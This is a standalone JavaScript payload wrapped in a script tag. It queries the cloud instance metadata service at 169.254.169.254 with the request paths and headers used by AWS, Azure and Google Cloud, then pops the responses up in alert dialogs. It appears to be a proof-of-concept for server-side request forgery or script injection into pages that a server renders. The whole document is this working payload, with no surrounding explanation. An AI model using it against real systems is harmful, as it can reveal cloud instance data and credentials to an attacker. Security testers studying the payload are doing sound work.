<script>async function fetchMetadata() {
    try {
        // AWS Metadata
        const awsResponse = await fetch('http://169.254.169.254/latest/meta-data/');
        const awsData = await awsResponse.text();
        alert("AWS Metadata:\n" + awsData);

        // Azure Metadata
        const azureResponse = await fetch('http://169.254.169.254/metadata/instance?api-version=2021-02-01', {
            headers: { 'Metadata': 'true' }
        });
        const azureData = await azureResponse.json();
        alert("Azure Metadata:\n" + JSON.stringify(azureData, null, 2));

        // GCP Metadata
        const gcpResponse = await fetch('http://169.254.169.254/computeMetadata/v1/', {
            headers: { 'Metadata-Flavor': 'Google' }
        });
        const gcpData = await gcpResponse.text();
        alert("GCP Metadata:\n" + gcpData);
        
    } catch (error) {
        console.error('Error fetching metadata:', error);
        alert("Error fetching metadata: " + error.message);
    }
}

// Call the function to fetch and display the metadata
fetchMetadata();
</script>
